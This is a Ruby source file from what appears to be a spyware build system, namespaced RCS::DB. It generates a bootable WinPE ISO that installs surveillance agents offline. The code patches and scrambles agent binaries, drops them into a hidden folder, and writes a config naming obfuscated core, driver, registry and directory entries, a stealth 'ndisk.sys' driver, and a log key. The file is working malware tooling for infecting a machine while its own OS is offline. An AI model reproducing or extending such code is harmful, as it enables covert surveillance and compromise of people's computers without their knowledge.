#
# Bootable ISO for offline install
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildISO < Build

  def initialize
    super
    @platform = 'offline'
  end

  def load(params)
    trace :debug, "Build: load: #{params}"

    params['platform'] = @platform
    super
  end

  def generate(params)
    trace :debug, "Build: generate: #{params}"

    names = {}
    
    params['platforms'].each do |platform|
      build = Build.factory(platform.to_sym)

      build.load({'_id' => @factory._id})
      build.unpack
      build.patch params['binary'].dup
      build.scramble

      names = build.scrambled.dup if platform == 'windows'

      # copy the scrambled files in our directories
      build.scrambled.keep_if {|k, v| k != :dir and k != :reg}.each_pair do |k, v|
        FileUtils.mkdir_p(path("winpe/RCSPE/files/#{platform.upcase}"))
        FileUtils.cp(File.join(build.tmpdir, v), path("winpe/RCSPE/files/#{platform.upcase}/" + v))
      end

      build.clean
    end

    key = @factory.logkey.chr.ord
    key = "%02X" % ((key > 127) ? (key - 256) : key)
        
    # write the ini file
    File.open(path('winpe/RCSPE/RCS.ini'), 'w') do |f|
      f.puts "[RCS]"
      f.puts "VERSION=#{File.read(Dir.pwd + '/config/version.txt')}"
      f.puts "HUID=#{@factory.ident}"
      f.puts "HCORE=#{names[:core]}"
      f.puts "HCONF=#{names[:config]}"
      f.puts "CODEC=#{names[:codec]}"
      f.puts "HDRV=#{names[:driver]}"
      f.puts "DLL64=#{names[:core64]}"
      f.puts "DRIVER64=#{names[:driver64]}"
      f.puts "HDIR=#{names[:dir]}"
      f.puts "HREG=#{names[:reg]}"
      f.puts "HSYS=ndisk.sys"
      f.puts "HKEY=#{key}"
    end

    # create the ISO image
    CrossPlatform.exec path('oscdimg'), "-u1 -l#{@factory.ident} -b#{path('winpe/boot/etfsboot.com')} #{path('winpe')} #{path('output.iso')}"
    raise "ISO creation failed" unless File.exist? path('output.iso')

    @outputs = ['output.iso']
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      @outputs.each do |out|
        z.file.open(out, "w") { |f| f.write File.open(path(out), 'rb') {|f| f.read} }
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']
  end

  def deliver(params)
    trace :debug, "Build: deliver: #{params}"
  end

end

end #DB::
end #RCS::
